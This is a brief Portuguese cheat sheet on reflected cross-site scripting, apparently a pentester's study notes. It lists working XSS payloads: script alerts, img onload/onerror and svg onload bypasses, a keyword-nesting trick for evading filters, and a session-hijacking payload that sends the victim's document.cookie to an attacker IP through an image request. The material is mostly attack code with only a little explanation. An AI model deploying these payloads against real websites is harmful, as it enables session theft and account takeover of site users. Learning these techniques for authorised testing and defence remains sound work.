# XSS (REFLECTED)

```
name=<script>alert('XSS')</script>
```



XSS (Reflected)

* XSS Refletido é quando o código malicioso enviado na requisição é refletido pelo site na resposta

Bypass para sites sem usar a tag script

```html
<!-- Disparando via onload (imagem válida ou inválida, dependendo do navegador) -->
<img src="google.com/logo.png" onload="alert('asiodjdioasoidas')">

<!-- Disparando via onerror (imagem inexistente força o erro e ativa o JS) -->
<img src="dasiojdjaiosijodsa.png" onerror="alert('imagem com erro')">

<svg onload="alert(0)"></svg>
```

```html
<script>
// window: controla a aba ou janela do navegador
// Exemplo: fecha a aba atual
window.close();

// document: interage com o DOM da página

//Retorna os cookies da sessão do usuário
alert(document.cookie);

//Retorna o domínio da página atual
alert(document.domain);
</script>
```



Bypass de filtro&#x20;

```
<scrscriptipt>alealertrt(0)</scrscriptipt>
```

XSS Session hijacking

```
<scrscriptipt>
new Image().src='http://<IP>/'+(docdocumentument.cookcookieie);
</scscriptript>
```

